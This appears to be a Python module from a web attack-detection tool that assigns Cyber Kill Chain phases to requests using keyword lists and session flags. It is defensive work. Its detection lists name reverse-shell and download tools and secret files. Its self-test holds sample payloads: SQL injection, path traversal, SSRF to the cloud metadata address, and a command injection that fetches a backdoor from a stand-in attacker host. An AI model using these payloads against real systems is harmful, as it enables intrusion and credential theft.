"""
intel/kill_chain.py — Lockheed Martin Cyber Kill Chain phase mapper

Maps attack type + payload + session flags to a kill chain phase using
rule-based heuristics. No ML required.

Phases:
  Reconnaissance → Weaponization → Delivery → Exploitation →
  Installation → Command & Control (C2) → Exfiltration
"""

import re
import logging

logger = logging.getLogger(__name__)

# Keyword signals for each phase
_RECON_KEYWORDS = [
    "robots.txt", "sitemap", "/.env", "/config", "/.git",
    "wp-admin", "phpmyadmin", "admin", "login", "version",
    "phpinfo", "server-status", "/.well-known",
]

_EXFIL_KEYWORDS = [
    "etc/passwd", "etc/shadow", "win.ini", "boot.ini",
    "database", "credentials", "token", "api_key", "secret",
    "backup", ".sql", ".bak", "dump",
]

_C2_KEYWORDS = [
    "wget", "curl", "http://", "https://", "ftp://",
    "python -c", "bash -i", "nc -e", "netcat",
    "169.254.169.254",   # AWS metadata — C2/SSRF
    "127.0.0.1", "localhost",
]

_INSTALL_KEYWORDS = [
    "shell.php", "webshell", "cmd.php", "eval(", "base64_decode(",
    "passthru(", "system(", "exec(", "popen(",
]

# Attack-type base phase (before payload refinement)
_ATTACK_BASE_PHASE: dict[str, str] = {
    "SQL_INJECTION":      "Exploitation",
    "XSS":                "Exploitation",
    "LFI":                "Exploitation",
    "PATH_TRAVERSAL":     "Reconnaissance",
    "RFI":                "Installation",
    "SSRF":               "Command & Control",
    "COMMAND_INJECTION":  "Exploitation",
}


def identify_kill_chain_phase(
    attack_type: str,
    payload: str,
    session_flags: dict,
) -> str:
    """
    Identify the most likely Cyber Kill Chain phase.

    Args:
        attack_type:   One of the 7 known attack types (or NORMAL/BENIGN)
        payload:       The decoded URL/payload string
        session_flags: Dict from session_tracker.get_session_flags()

    Returns:
        One of: Reconnaissance / Weaponization / Delivery /
                Exploitation / Installation / Command & Control / Exfiltration
    """
    p = payload.lower() if payload else ""
    attack_up = attack_type.upper() if attack_type else ""

    # ── Step 1: Start with attack-type base phase ─────────────────────────────
    phase = _ATTACK_BASE_PHASE.get(attack_up, "Delivery")

    # ── Step 2: Payload keyword overrides ────────────────────────────────────
    for kw in _EXFIL_KEYWORDS:
        if kw in p:
            phase = "Exfiltration"
            break

    if phase != "Exfiltration":
        for kw in _INSTALL_KEYWORDS:
            if kw in p:
                phase = "Installation"
                break

    if phase not in ("Exfiltration", "Installation"):
        for kw in _C2_KEYWORDS:
            if kw in p:
                phase = "Command & Control"
                break

    if phase not in ("Exfiltration", "Installation", "Command & Control"):
        for kw in _RECON_KEYWORDS:
            if kw in p:
                phase = "Reconnaissance"
                break

    # ── Step 3: Session flag escalation ──────────────────────────────────────
    # If IP is multi-vector and escalating, bump to a later phase
    if session_flags.get("is_multi_vector") and session_flags.get("is_escalating"):
        if phase in ("Reconnaissance", "Delivery"):
            phase = "Exploitation"

    # Rapid fire with errors → likely fuzzing / recon
    if session_flags.get("is_rapid_fire") and session_flags.get("is_error_heavy"):
        if phase == "Delivery":
            phase = "Reconnaissance"

    return phase


if __name__ == "__main__":
    tests = [
        ("SQL_INJECTION",  "id=1 UNION SELECT username,password FROM users", {}),
        ("LFI",            "../../etc/passwd",                               {}),
        ("RFI",            "http://evil.com/shell.php",                      {}),
        ("SSRF",           "http://169.254.169.254/latest/meta-data/",       {"is_multi_vector": True, "is_escalating": True}),
        ("COMMAND_INJECTION", "cmd=wget http://attacker.com/backdoor.sh",    {}),
        ("PATH_TRAVERSAL", "/admin/config.php",                              {"is_rapid_fire": True, "is_error_heavy": True}),
    ]

    print("\n── kill_chain self-test ──\n")
    for atk, payload, flags in tests:
        phase = identify_kill_chain_phase(atk, payload, flags)
        print(f"{atk:25s} | {phase:25s} | {payload[:50]}")
